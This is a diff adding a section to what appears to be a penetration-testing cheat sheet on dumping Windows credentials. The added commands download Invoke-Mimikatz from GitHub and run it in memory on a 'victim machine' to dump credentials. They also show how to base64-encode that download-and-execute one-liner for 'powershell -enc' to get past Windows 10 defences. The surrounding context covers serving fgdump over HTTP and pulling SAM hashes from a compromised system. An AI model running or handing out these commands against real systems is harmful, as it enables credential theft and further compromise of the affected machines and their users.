@@ -97,6 +97,34 @@ root@kali:~# cd /usr/share/windows-binaries/fgdump
 root@kali:/usr/share/windows-binaries/fgdump# python -m SimpleHTTPServer 80
 ```
 
+### Using powershell mimikatz
+
+Use the newer version of Invoke-Mimikatz, available in Empire 3.0 on the victim machine:
+
+```
+C:\> powershell -c "IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;"
+```
+
+*For Windows 10:*
+
+Encode the command using the following trick in you Kali machine:
+
+```
+root@kali:~# iconv -f ASCII -t UTF-16LE <<<'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1"); $m = Invoke-Mimikatz -DumpCreds; $m' | base64 -w 0
+```
+
+It will output:
+
+```
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG...
+```
+
+Then use it in your powershell command:
+
+```
+C:\> powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG...
+```
+
 ### From Compromised system
 
 If we already compromised system, then we able extract the values of SAM files from you system and then dump thier hashes in your kali machine:
